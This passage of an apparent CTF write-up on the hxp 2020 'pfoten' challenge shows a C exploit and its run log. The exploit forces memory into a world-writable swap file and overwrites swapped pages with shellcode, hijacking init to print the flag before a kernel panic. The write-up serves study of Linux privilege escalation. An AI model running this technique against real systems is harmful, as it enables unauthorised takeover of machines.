+</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">res</span> <span class="o">=</span> <span class="n">memmem</span><span class="p">(</span><span class="n">swap_buf</span><span class="p">,</span> <span class="n">swap_size</span><span class="p">,</span> <span class="n">NEEDLE</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">NEEDLE</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+        <span class="n">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">res</span> <span class="o">-</span> <span class="n">swap_buf</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">fseek</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">die</span><span class="p">(</span><span class="s">&#34;fseek failed&#34;</span><span class="p">);</span>
+        <span class="c1">// 0xcc to debug 
+</span><span class="c1"></span>        <span class="kt">char</span> <span class="n">sc_buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">sc_buf</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc_buf</span><span class="p">));</span>
+        
+        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> 
+            <span class="c1">// needle for padding
+</span><span class="c1"></span>            <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> 
+            <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> 
+            <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span>
+            <span class="c1">// real shellcode
+</span><span class="c1"></span>            <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x5</span>
+        <span class="p">};</span>
+        <span class="c1">// empty needle using nop, slip backward to our real shellcode 
+</span><span class="c1"></span>        <span class="n">memset</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">NEEDLE</span><span class="p">));</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">fwrite</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc</span><span class="p">),</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span> <span class="c1">// write to swap file
+</span><span class="c1"></span>            <span class="n">die</span><span class="p">(</span><span class="s">&#34;fwrite failed&#34;</span><span class="p">);</span>
+        <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> 
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;found needle at offset : %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">swap_buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">swap_size</span><span class="p">);</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+    <span class="c1">// consume some ram first
+</span><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="kt">void</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">die</span><span class="p">(</span><span class="s">&#34;mmap error&#34;</span><span class="p">);</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;swap_buf at %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">swap_buf</span><span class="p">);</span>
+
+    <span class="c1">// keep mmaping, search for strings every iteration
+</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span><span class="o">++</span><span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">320</span><span class="o">*</span><span class="mi">6</span><span class="p">)){</span>
+        <span class="kt">void</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">die</span><span class="p">(</span><span class="s">&#34;mmap error&#34;</span><span class="p">);</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">50</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">match</span><span class="p">())</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Excellent! After only two attempts, we get flag!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/ $ /exp
+swap_buf at 0x4c4300
+50
+[    6.048215] Out of memory: Killed process 82 (exp) total-vm:50740kB, anon-rss:10288kB, file-rss:4kB, shmem-rss:29584kB, UID:1 pgtables:136kB oom_score_adj:0
+Killed
+/ $ /exp
+swap_buf at 0x4c4300
+50
+found needle at offset : 0x592277
+@Gp@GpXGpXGp�Gp�Gp�Gp�Gp�Gp�Gp�Gp�Gp�Gpflag{TEST}
+[   12.215551] init[1]: segfault at 100 ip 00000000004d12f2 sp 00007ffe3b5fe908 error 4 in busybox[400000+104000]
+[   12.216620] Code: 31 d2 b6 01 be 01 01 01 01 81 f6 01 46 71 01 0f 05 6a 01 5f 31 d2 b6 01 be 01 01 01 01 81 f6 01 46 71 01 6a 01 58 0f 05 14 d6 &lt;48&gt; 8b 0a 48 85 c9 0f 84 8a 00 00 00 48a
+[   12.217481] Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b
+[   12.217996] CPU: 0 PID: 1 Comm: init Not tainted 5.8.5 #1
+[   12.218194] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+[   12.218543] Call Trace:
+[   12.219598]  dump_stack+0x57/0x70
+[   12.219771]  panic+0xf6/0x2b7
+[   12.219870]  do_exit.cold+0xda/0xdb
+[   12.219979]  do_group_exit+0x2e/0x90
+[   12.220090]  get_signal+0x16a/0x840
+[   12.220200]  do_signal+0x2b/0x6e0
+[   12.220302]  ? force_sig_info_to_task+0xb9/0xf0
+[   12.220457]  ? force_sig_fault+0x47/0x70
+[   12.220578]  ? __bad_area_nosemaphore+0xf7/0x140
+[   12.220717]  __prepare_exit_to_usermode+0xfa/0x160
+[   12.220864]  ? asm_exc_page_fault+0x8/0x30
+[   12.220987]  prepare_exit_to_usermode+0x5/0x20
+[   12.221132]  asm_exc_page_fault+0x1e/0x30
+[   12.221474] RIP: 0033:0x4d12f2
+[   12.221603] Code: 31 d2 b6 01 be 01 01 01 01 81 f6 01 46 71 01 0f 05 6a 01 5f 31 d2 b6 01 be 01 01 01 01 81 f6 01 46 71 01 6a 01 58 0f 05 14 d6 &lt;48&gt; 8b 0a 48 85 c9 0f 84 8a 00 00 00 48a
+[   12.222163] RSP: 002b:00007ffe3b5fe908 EFLAGS: 00000282
+[   12.222335] RAX: 00000000000001d6 RBX: 0000000000000000 RCX: 00000000004d12f0
+[   12.222546] RDX: 0000000000000100 RSI: 0000000000704700 RDI: 0000000000000001
+[   12.222757] RBP: 00000000ffffffff R08: 0000000000000000 R09: 0000000000000000
+[   12.222968] R10: 0000000000000000 R11: 0000000000000206 R12: 0000000000000000
+[   12.223198] R13: 0000000000405914 R14: 0000000000000000 R15: 0000000000000000
+[   12.223821] Kernel Offset: 0xfe00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[   12.224347] ---[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b ]---
+qemu-system-x86_64: terminating on signal 2
+</code></pre></td></tr></table>
+</div>
+</div><p>It&rsquo;s really fantastic, with only a slight umask bug we can gain fully control of the system. But as there is something probablistic and unpredictable when Linux using swap files, it takes tons of attempts trying to figure out what&rsquo;s the best PAGE_SIZE set in exploits to let Linux swap targets into <code>/swap</code> file more quickly and stably, which is largely depends on the very machine we are attacking.</p>
+<p>Download source code of busybox at [10] and compile with symbols by yourself.</p>
+<h1 id="ref">Ref</h1>
+<p>[1] <a href="https://2020.ctf.link/internal/" target="_blank" rel="noopener noreffer">https://2020.ctf.link/internal/</a></p>
+<p>[2] <a href="https://lwn.net/Articles/824307/" target="_blank" rel="noopener noreffer">https://lwn.net/Articles/824307/</a></p>
+<p>[3] <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique" target="_blank" rel="noopener noreffer">https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique</a></p>
+<p>[4] <a href="https://man7.org/linux/man-pages/man2/umask.2.html" target="_blank" rel="noopener noreffer">https://man7.org/linux/man-pages/man2/umask.2.html</a></p>
+<p>[5] <a href="https://man7.org/linux/man-pages/man8/losetup.8.html" target="_blank" rel="noopener noreffer">https://man7.org/linux/man-pages/man8/losetup.8.html</a></p>
+<p>[6] <a href="https://man7.org/linux/man-pages/man8/mkswap.8.html" target="_blank" rel="noopener noreffer">https://man7.org/linux/man-pages/man8/mkswap.8.html</a></p>
+<p>[7] <a href="https://wiki.archlinux.org/title/swap" target="_blank" rel="noopener noreffer">https://wiki.archlinux.org/title/swap</a></p>
+<p>[8] <a href="https://mem2019.github.io/jekyll/update/2020/12/21/hxp2020-pfoten.html" target="_blank" rel="noopener noreffer">https://mem2019.github.io/jekyll/update/2020/12/21/hxp2020-pfoten.html</a></p>
+<p>[9] <a href="https://pullp.github.io/2020/12/28/hxp2020-pfoten/" target="_blank" rel="noopener noreffer">https://pullp.github.io/2020/12/28/hxp2020-pfoten/</a></p>
+<p>[10] <a href="https://www.busybox.net/" target="_blank" rel="noopener noreffer">https://www.busybox.net/</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-08-23</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021/08/hxp2020/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2021/08/hxp2020/" data-title="Hxp2020"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2021/08/hxp2020/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2021/08/hxp2020/" data-title="Hxp2020" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2021/08/hxp2020/" data-title="Hxp2020"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://xidoo.top/2021/08/hxp2020/" data-title="Hxp2020"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2021/08/hxp2020/" data-title="Hxp2020" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2021/08/hxp2020/" data-title="Hxp2020" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2021/08/hxp2020/" data-title="Hxp2020"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/08/bsides-noida-ctf-2021/" class="prev" rel="prev" title="BSides Noida CTF 2021"><i class="fas fa-angle-left fa-fw"></i>BSides Noida CTF 2021</a>
+            <a href="/2021/08/first_post/" class="next" rel="next" title="Init New World">Init New World<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">🏴‍☠️ Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
